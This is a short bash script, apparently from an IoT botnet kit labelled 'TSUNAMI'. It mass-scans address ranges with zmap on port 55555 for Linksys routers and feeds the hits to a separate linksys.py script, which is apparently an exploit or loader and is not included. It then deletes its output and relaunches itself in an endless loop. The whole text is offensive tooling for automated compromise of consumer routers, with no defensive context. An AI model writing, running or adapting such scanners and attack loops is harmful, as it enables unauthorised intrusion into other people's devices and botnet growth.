#!/bin/bash
clear
echo -e "\e[1;97m[\e[1;36mTSUNAMI\e[1;97m] \e[1;36mNow Auto-Scanning Linksys"
zmap -p55555 -w Linksys.lst -o linky.txt -B100M
ulimit -n 999999
python linksys.py linky.txt
rm -rf linky.txt
clear
sh linksys.sh
